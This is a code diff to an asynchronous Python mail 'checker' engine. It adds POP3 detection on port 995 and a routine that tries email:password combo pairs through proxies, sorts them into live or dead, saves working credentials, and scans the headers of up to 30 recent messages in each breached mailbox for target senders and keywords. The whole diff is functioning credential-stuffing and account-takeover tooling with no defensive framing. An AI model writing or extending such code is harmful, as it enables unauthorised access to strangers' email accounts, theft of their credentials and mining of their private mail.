@@ -210,7 +210,7 @@ class FastImapEngine:
         if domain in self._unreg_domains_set:
             return None
 
-        candidates = [f"imap.{domain}", f"mail.{domain}", domain]
+        candidates = [f"imap.{domain}", f"mail.{domain}", domain, f"pop.{domain}"]
         for host in candidates:
             ip = await self._resolve_ip(host)
             if not ip:
@@ -246,6 +246,23 @@ class FastImapEngine:
                     return cfg
             except Exception:
                 pass
+
+            # Try port 995 POP3 SSL
+            if host.startswith("pop."):
+                try:
+                    reader, writer = await asyncio.wait_for(
+                        asyncio.open_connection(ip, 995, ssl=_GLOBAL_SSL_CTX, server_hostname=host),
+                        timeout=2.0
+                    )
+                    banner = await asyncio.wait_for(reader.readline(), timeout=1.5)
+                    writer.close()
+                    await writer.wait_closed()
+                    if banner and banner.strip().startswith(b"+OK"):
+                        cfg = {"server": host, "port": 995, "protocol": "pop3", "ssl": True}
+                        self._runtime_resolved_domains[domain] = cfg
+                        return cfg
+                except Exception:
+                    pass
 
         self._unreg_domains_set.add(domain)
         return None
@@ -340,8 +357,203 @@ class FastImapEngine:
                 pass
         return results
 
+    async def _check_single_account_pop3(
+        self,
+        server: str,
+        port: int,
+        use_ssl: bool,
+        proxy: Optional[Dict[str, Any]],
+        email_addr: str,
+        password: str,
+        combo: str,
+    ):
+        """Check one account through raw POP3."""
+        reader = None
+        writer = None
+        try:
+            reader, writer = await self._connect_imap(server, port, use_ssl, proxy)
+            banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+            if not banner or not banner.strip().startswith(b"+OK"):
+                raise ConnectionError("Invalid POP3 greeting banner")
+
+            # Try USER with full email address
+            writer.write(f"USER {email_addr}\r\n".encode())
+            await writer.drain()
+            resp = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+
+            # If rejected, try username without domain
+            if not resp.strip().startswith(b"+OK"):
+                user_short = email_addr.split("@")[0]
+                writer.write(f"USER {user_short}\r\n".encode())
+                await writer.drain()
+                resp = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+
+            if not resp.strip().startswith(b"+OK"):
+                self.die_count += 1
+                self.checked += 1
+                await self.write_queue.put(("die", combo))
+                if self.on_progress:
+                    self.on_progress("die")
+                try:
+                    writer.write(b"QUIT\r\n")
+                    await writer.drain()
+                except Exception:
+                    pass
+                return
+
+            # Send PASS
+            writer.write(f"PASS {password}\r\n".encode())
+            await writer.drain()
+            pass_resp = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+
+            if not pass_resp.strip().startswith(b"+OK"):
+                self.die_count += 1
+                self.checked += 1
+                await self.write_queue.put(("die", combo))
+                if self.on_progress:
+                    self.on_progress("die")
+                try:
+                    writer.write(b"QUIT\r\n")
+                    await writer.drain()
+                except Exception:
+                    pass
+                return
+
+            # Account is LIVE!
+            is_pure_empass = (self.target_senders == ["*"]) or (not self.target_senders and not self.keywords)
+            if is_pure_empass:
+                self.live_count += 1
+                self.checked += 1
+                await self.write_queue.put(("live", f"[+] Account: {email_addr}:{password}"))
+                if self.on_live:
+                    self.on_live({
+                        "account": email_addr,
+                        "password": password,
+                        "email_count": 0,
+                        "emails": []
+                    })
+                if self.on_progress:
+                    self.on_progress("live")
+                try:
+                    writer.write(b"QUIT\r\n")
+                    await writer.drain()
+                except Exception:
+                    pass
+                return
+
+            # Search POP3 mailbox: send STAT to get total messages
+            writer.write(b"STAT\r\n")
+            await writer.drain()
+            stat_resp = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+            msg_count = 0
+            try:
+                parts = stat_resp.decode(errors="ignore").strip().split()
+                if len(parts) >= 2 and parts[1].isdigit():
+                    msg_count = int(parts[1])
+            except Exception:
+                pass
+
+            emails_data = []
+            if msg_count > 0:
+                import email as _email
+                import email.utils
+                check_limit = min(30, msg_count)
+                for msg_idx in range(msg_count, msg_count - check_limit, -1):
+                    writer.write(f"TOP {msg_idx} 0\r\n".encode())
+                    await writer.drain()
+                    top_data = b""
+                    while True:
+                        line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+                        if not line or line == b".\r\n" or line == b".\n":
+                            break
+                        top_data += line
+                        if len(top_data) > 8192:
+                            break
+
+                    try:
+                        msg = _email.message_from_bytes(top_data)
+                        subj = _decode_header_words(msg.get("Subject", ""))
+                        from_raw = _decode_header_words(msg.get("From", ""))
+                        _name, from_addr = email.utils.parseaddr(from_raw)
+                        date_raw = _decode_header_words(msg.get("Date", ""))
+                        try:
+                            dt = email.utils.parsedate_to_datetime(date_raw)
+                            fmt_date = dt.strftime('%d-%b-%Y %H:%M')
+                        except Exception:
+                            fmt_date = date_raw
+
+                        if _subject_excluded(subj, self.subject_exclusion_patterns):
+                            continue
+
+                        matched = False
+                        if self.target_senders:
+                            for ts in self.target_senders:
+                                if ts == "*":
+                                    matched = True
+                                    break
+                                clean_ts = ts.lstrip("@").lower()
+                                if clean_ts in (from_addr or from_raw).lower():
+                                    matched = True
+                                    break
+
+                        if not matched and self.keywords:
+                            for kw in self.keywords:
+                                if kw.lower() in subj.lower():
+                                    matched = True
+                                    break
+
+                        if matched:
+                            emails_data.append({
+                                "subject": subj,
+                                "from": from_addr or from_raw,
+                                "date": fmt_date,
+                            })
+                    except Exception:
+                        pass
+
+            if emails_data:
+                self.live_count += 1
+                self.checked += 1
+                report_entry = format_live_report_entry(email_addr, password, emails_data, self.search_since)
+                await self.write_queue.put(("live", report_entry))
+                if self.on_live:
+                    self.on_live({
+                        "account": email_addr,
+                        "password": password,
+                        "email_count": len(emails_data),
+                        "emails": emails_data
+                    })
+                if self.on_progress:
+                    self.on_progress("live")
+            else:
+                self.noemail_count += 1
+                self.checked += 1
+                await self.write_queue.put(("noemail", combo))
+                if self.on_progress:
+                    self.on_progress("noemail")
+
+            try:
+                writer.write(b"QUIT\r\n")
+                await writer.drain()
+            except Exception:
+                pass
+
+        except Exception:
+            self.die_count += 1
+            self.checked += 1
+            await self.write_queue.put(("die", combo))
+            if self.on_progress:
+                self.on_progress("die")
+        finally:
+            if writer:
+                try:
+                    writer.close()
+                    await writer.wait_closed()
+                except Exception:
+                    pass
+
     async def _check_single_account(self, sem: asyncio.Semaphore, account: Dict[str, str]):
-        """Check one account through raw IMAP."""
+        """Check one account through raw IMAP or POP3."""
         async with sem:
             if self.stop_event.is_set():
                 return
@@ -393,8 +605,14 @@ class FastImapEngine:
 
             server = str(cfg.get("server", ""))
             port = int(cfg.get("port", 993))
-            use_ssl = cfg.get("ssl", (port == 993))
+            use_ssl = cfg.get("ssl", (port in (993, 995)))
+            protocol = str(cfg.get("protocol", "imap")).lower()
             proxy = self._get_proxy()
+
+            # Protocol POP3 direct route
+            if protocol == "pop3" or port in (995, 110):
+                await self._check_single_account_pop3(server, port, use_ssl, proxy, email_addr, password, combo)
+                return
 
             reader = None
             writer = None
@@ -402,6 +620,15 @@ class FastImapEngine:
             try:
                 reader, writer = await self._connect_imap(server, port, use_ssl, proxy)
                 banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+                if banner and banner.strip().startswith(b"+OK"):
+                    # Server is actually POP3
+                    try:
+                        writer.close()
+                        await writer.wait_closed()
+                    except Exception:
+                        pass
+                    await self._check_single_account_pop3(server, port, use_ssl, proxy, email_addr, password, combo)
+                    return
                 if not banner or not (b"* OK" in banner.upper() or b"IMAP" in banner.upper()):
                     raise ConnectionError("Invalid greeting banner")
             except Exception:
